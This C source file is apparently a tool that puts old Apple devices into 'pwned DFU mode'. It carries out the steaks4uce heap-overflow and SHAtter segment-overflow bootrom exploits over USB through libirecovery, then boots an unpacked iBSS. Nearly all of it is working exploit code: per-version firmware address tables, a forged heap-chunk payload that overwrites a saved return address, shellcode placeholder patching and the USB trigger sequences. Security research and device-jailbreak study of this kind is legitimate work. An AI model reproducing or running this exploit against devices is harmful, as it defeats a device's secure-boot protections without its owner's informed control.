#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include "shatter.h"
#include "steaks4uce.h"
#include <libirecovery.h>

#define MAX_PACKET_SIZE 0x800

const uint32_t constants_240_4[] = {
    0x22030000, //  1 - MAIN_STACK_ADDRESS
        0x3af5, //  2 - nor_power_on
        0x486d, //  3 - nor_init
        0x6c81, //  4 - usb_destroy
        0x1059, //  5 - usb_shutdown
         0x560, //  6 - invalidate_instruction_cache
    0x2202d800, //  7 - RELOCATE_SHELLCODE_ADDRESS
         0x200, //  8 - RELOCATE_SHELLCODE_SIZE
        0x795c, //  9 - memmove
         0x534, // 10 - clean_data_cache
         0x280, // 11 - gVersionString
        0x83cd, // 12 - strlcat
        0x30e9, // 13 - usb_wait_for_image
    0x22000000, // 14 - LOAD_ADDRESS
       0x24000, // 15 - MAX_SIZE
    0x220241ac, // 16 - gLeakingDFUBuffer
        0x1955, // 17 - free
    0x65786563, // 18 - EXEC_MAGIC
        0x1bf1, // 19 - memz_create
        0x3339, // 20 - jump_to
        0x1c19, // 21 - memz_destroy
          0x58, // 22 - IMAGE3_LOAD_SP_OFFSET
          0x54, // 23 - IMAGE3_LOAD_STRUCT_OFFSET
        0x1c5d, // 24 - image3_create_struct
        0x22cd, // 25 - image3_load_continue
        0x23a3  // 26 - image3_load_fail
};

const uint32_t constants_240_5_1[] = {
    0x22030000, //  1 - MAIN_STACK_ADDRESS
        0x3afd, //  2 - nor_power_on
        0x4875, //  3 - nor_init
        0x6c89, //  4 - usb_destroy
        0x1059, //  5 - usb_shutdown
         0x560, //  6 - invalidate_instruction_cache
    0x2202d800, //  7 - RELOCATE_SHELLCODE_ADDRESS
         0x200, //  8 - RELOCATE_SHELLCODE_SIZE
        0x7964, //  9 - memmove
         0x534, // 10 - clean_data_cache
         0x280, // 11 - gVersionString
        0x83d5, // 12 - strlcat
        0x30f1, // 13 - usb_wait_for_image
    0x22000000, // 14 - LOAD_ADDRESS
       0x24000, // 15 - MAX_SIZE
    0x220241ac, // 16 - gLeakingDFUBuffer
        0x1955, // 17 - free
    0x65786563, // 18 - EXEC_MAGIC
        0x1bf9, // 19 - memz_create
        0x3341, // 20 - jump_to
        0x1c21, // 21 - memz_destroy
          0x58, // 22 - IMAGE3_LOAD_SP_OFFSET
          0x54, // 23 - IMAGE3_LOAD_STRUCT_OFFSET
        0x1c65, // 24 - image3_create_struct
        0x22d5, // 25 - image3_load_continue
        0x23ab  // 26 - image3_load_fail
};

const uint32_t payload_data[] = {
          0x84, // 0x00: previous_chunk
          0x05, // 0x04: next_chunk
          0x80, // 0x08: buffer[0] - direction
    0x22026280, // 0x0c: buffer[1] - usb_response_buffer
    0xFFFFFFFF, // 0x10: buffer[2]
         0x138, // 0x14: buffer[3] - size of payload in bytes
         0x100, // 0x18: buffer[4]
           0x0, // 0x1c: buffer[5]
           0x0, // 0x20: buffer[6]
           0x0, // 0x24: unused
          0x15, // 0x28: previous_chunk (fake free chunk)
           0x2, // 0x2c: next_chunk
    0x22000001, // 0x30: fd - shellcode_address
    0x2202D7FC  // 0x34: bk - LR on the stack
};

int prepare_shellcode(const char* srtg) {
    const uint32_t *constants = NULL;
    if (strstr(srtg, "240.4"))
        constants = constants_240_4;
    else
        constants = constants_240_5_1;

    size_t const_offset = steaks4uce_shellcode_len - 4 * 26;

    for (int i = 0; i < 26; i++) {
        uint32_t *ptr = (uint32_t*)(steaks4uce_shellcode + const_offset + 4 * i);
        if (*ptr != (0xBAD00001 + i)) {
            fprintf(stderr, "ERROR: Placeholder mismatch at index %d (expected 0x%08x, found 0x%08x)\n", i, *ptr, 0xBAD00001 + i);
            return -1;
        }
        *ptr = constants[i];
    }

    return 0;
}

int acquire_device(irecv_client_t *client) {
    irecv_error_t err;

    for (int i = 0; i <= 5; i++) {
        printf("Acquiring device handle.\n");

        err = irecv_open_with_ecid(client, 0);
        if (err == IRECV_E_UNSUPPORTED) {
            fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
            return -1;
        } else if (err == IRECV_E_SUCCESS) {
            return 0;
        }

        sleep(1);
    }

    fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
    return -1;
}

void release_device(irecv_client_t client) {
    printf("Releasing device handle.\n");
    irecv_close(client);
}

int send_data(irecv_client_t client, const unsigned char* data, size_t data_len) {
    size_t index = 0;
    printf("Sending 0x%zx bytes of data to device.\n", data_len);

    while (index < data_len) {
        size_t amount = (data_len - index > MAX_PACKET_SIZE) ? MAX_PACKET_SIZE : (data_len - index);
        int ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)(data + index), (uint16_t)amount, 5000);
        if (ret != amount) {
            fprintf(stderr, "Transfer failed at index %zu: expected %zu, got %d\n", index, amount, ret);
            return -1;
        }
        index += amount;
    }

    return 0;
}

int get_data(irecv_client_t client, size_t amount){
    int ret;
    unsigned char part[MAX_PACKET_SIZE];
    printf("Getting 0x%zx bytes of data from device.\n", amount);

    for(int i = 0; i < amount; i += MAX_PACKET_SIZE){
        int transfer_size = (amount - i < MAX_PACKET_SIZE) ? (amount - i) : MAX_PACKET_SIZE;
        ret = irecv_usb_control_transfer(client, 0xA1, 2, 0, 0, part, transfer_size, 100);
    }

    return ret;
}

int usb_reset(irecv_client_t client) {
    printf("Performing USB port reset.\n");
    int ret = irecv_reset(client);
    if (ret < 0) {
        fprintf(stderr, "ERROR: Unable to USB port reset.\n");
        return -1;
    }
    return ret;
}

int request_image_validation(irecv_client_t client) {
    int ret;
    unsigned char dummy[6];
    printf("Requesting image validation.\n");

    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, 0, 0, 1000);
    if (ret != 0) {
        fprintf(stderr, "Control transfer (0x21,1) failed with code %d\n", ret);
        return -1;
    }

    for (int i = 0; i < 3; i++) {
        ret = irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, dummy, 6, 1000);
        if (ret != 6) {
            fprintf(stderr, "Control transfer (0xA1,3) #%d failed with code %d\n", i + 1, ret);
            return -1;
        }
    }

    return usb_reset(client);
}

int steaks4uce_exploit(irecv_client_t client) {
    int ret;
    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
    unsigned char payload[0x138] = {0};
    memcpy(payload + 0x100, payload_data, sizeof(payload_data));
    prepare_shellcode(devinfo->srtg);
    printf("*** based on steaks4uce exploit (heap overflow) by pod2g ***\n");

    printf("Resetting USB counters.\n");
    ret = irecv_reset_counters(client);
    if (ret < 0) {
        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
        return -1;
    }

    printf("Uploading patched shellcode for %s: %#zx of data\n", devinfo->srtg, (size_t)steaks4uce_shellcode_len);
    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, steaks4uce_shellcode, steaks4uce_shellcode_len, 5000);
    if (ret < 0) {
        fprintf(stderr, "ERROR: Failed to send steaks4uce to the device.\n");
        return -1;
    }

    printf("Uploading payload: %#zx of data\n", sizeof(payload));
    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, payload, sizeof(payload), 5000);
    if (ret < 0) {
        fprintf(stderr, "ERROR: Failed to upload payload.\n");
        return -1;
    }

    printf("Triggering the exploit.\n");
    ret = irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, payload, sizeof(payload), 1000);
    if (ret != sizeof(payload)) {
        fprintf(stderr, "ERROR: Failed to execute steaks4uce.\n");
        return -1;
    }

    release_device(client);

    ret = acquire_device(&client);
    if (ret < 0) {
        return -1;
    }

    printf("Reconnecting to device.\n");
    client = irecv_reconnect(client, 2);
    if (client == NULL) {
        fprintf(stderr, "ERROR: Unable to reconnect to device.\n");
        return -1;
    }

    devinfo = irecv_get_device_info(client);
    char* p = strstr(devinfo->serial_string, "PWND:[steaks4uce]");
    if (!p) {
        fprintf(stderr, "ERROR: Exploit failed. Device did not enter pwned DFU mode.\n");
        return -1;
    }

    release_device(client);

    printf("Device is now in pwned DFU mode.\n");
    return 0;
}

int shatter_exploit(irecv_client_t client) {
    int ret;
    printf("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***\n");

    printf("Resetting USB counters.\n");
    ret = irecv_reset_counters(client);
    if (ret < 0) {
        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
        return -1;
    }

    ret = get_data(client, 0x40);
    if (ret < 0) {
        return -1;
    }

    ret = usb_reset(client);
    if (ret < 0) {
        return -1;
    }

    release_device(client);

    ret = acquire_device(&client);
    if (ret < 0) {
        return -1;
    }

    ret = request_image_validation(client);
    if (ret < 0) {
        return -1;
    }

    release_device(client);

    ret = acquire_device(&client);
    if (ret < 0) {
        return -1;
    }

    ret = get_data(client, 0x2C000);
    if (ret < 0) {
        return -1;
    }

    release_device(client);

    usleep(500000);

    ret = acquire_device(&client);
    if (ret < 0) {
        return -1;
    }

    printf("Resetting USB counters.\n");
    ret = irecv_reset_counters(client);
    if (ret < 0) {
        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
        return -1;
    }

    ret = get_data(client, 0x140);
    if (ret < 0) {
        return -1;
    }

    usb_reset(client);

    release_device(client);

    ret = acquire_device(&client);
    if (ret < 0) {
        return -1;
    }

    ret = request_image_validation(client);
    if (ret < 0) {
        return -1;
    }

    release_device(client);

    ret = acquire_device(&client);
    if (ret < 0) {
        return -1;
    }

    ret = send_data(client, shatter_shellcode, shatter_shellcode_len);
    if (ret < 0) {
        return -1;
    }

    ret = get_data(client, 0x2C000);
    if (ret < 0) {
        return -1;
    }

    release_device(client);

    usleep(500000);

    ret = acquire_device(&client);
    if (ret < 0) {
        return -1;
    }

    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
    char* p = strstr(devinfo->serial_string, "PWND:[SHAtter]");
    if (!p) {
        fprintf(stderr, "ERROR: Exploit failed. Device did not enter pwned DFU mode.\n");
        return -1;
    }

    release_device(client);

    printf("Device is now in pwned DFU mode.\n");
    return 0;
}

int boot_unpacked_ibss(irecv_client_t client, const char *ibss_path) {
    FILE *f = fopen(ibss_path, "rb");
    if (!f) {
        fprintf(stderr, "ERROR: Unable to open iBSS file\n");
        return -1;
    }
    printf("iBSS file found: %s\n", ibss_path);

    fseek(f, 0, SEEK_END);
    int ibss_len = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *ibss_data = malloc(ibss_len);
    if (!ibss_data) {
        fprintf(stderr, "ERROR: malloc failed for iBSS data\n");
        fclose(f);
        return -1;
    }

    if (fread(ibss_data, 1, ibss_len, f) != ibss_len) {
        fprintf(stderr, "ERROR: fread failed for iBSS\n");
        fclose(f);
        free(ibss_data);
        return -1;
    }
    fclose(f);

    unsigned char response_buf[0xFFFF + 1];
    unsigned char blank[16] = {0};
    send_data(client, blank, 16);
    irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 100);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
    send_data(client, ibss_data, ibss_len);

    irecv_usb_control_transfer(client, 0xA1, 2, 0xFFFF, 0, NULL, 0, 5000);

    release_device(client);
    free(ibss_data);

    return 0;
}

int main(int argc, char* argv[]) {
    int ret;

    irecv_client_t client = NULL;
    ret = acquire_device(&client);
    if (ret < 0) {
        return -1;
    }

    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
    char* p = strstr(devinfo->serial_string, "PWND:[");
    if (argc > 1) {
        if (p) {
            ret = boot_unpacked_ibss(client, argv[1]);
            return ret;
        } else {
            fprintf(stderr, "ERROR: Device is not in pwned DFU mode. Cannot boot unpacked iBSS.\n");
            return -1;
        }
    } else if (p) {
        printf("Device is already in pwned DFU mode.\n");
        return 0;
    }

    if (devinfo->cpid == 0x8720)
        ret = steaks4uce_exploit(client);
    else if (devinfo->cpid == 0x8930)
        ret = shatter_exploit(client);
    else {
        fprintf(stderr, "ERROR: Device is not an iPod touch 2nd generation or A4 device (CPID: %#x)\n", devinfo->cpid);
        return -1;
    }

    return ret;
}
